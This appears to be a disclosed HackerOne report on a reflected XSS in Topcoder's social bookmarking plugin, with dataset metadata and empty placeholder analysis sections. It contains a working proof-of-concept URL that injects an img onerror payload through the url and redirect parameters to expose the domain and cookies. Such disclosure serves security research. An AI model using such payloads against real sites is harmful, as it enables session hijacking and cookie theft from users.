---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '866829'
original_report_id: '866829'
title: Reflected XSS on https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: topcoder
created_at: '2020-05-05T22:26:20.231Z'
disclosed_at: '2020-05-12T13:41:20.958Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
asset_identifier: apps.topcoder.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action

## Metadata

- HackerOne Report ID: 866829
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: topcoder
- Disclosed At: 2020-05-12T13:41:20.958Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Hi :) A reflected XSS occurs when creating bookmarks.

## Steps To Reproduce:

A user can create bookmarks on https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action. In this url  `redirect` and `url` parameters are vulnerable to XSS.

PoC:
`https://apps.topcoder.com/wiki/plugins/socialbookmarking/updatebookmark.action?url=Asd"><img src=X onerror=alert(document.domain)>&redirect=Asd"><img src=X onerror=alert(document.cookie)>`

{F816796}
{F816795}

## Impact

XSS can use to steal cookies or to run arbitrary code on victim's browser.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
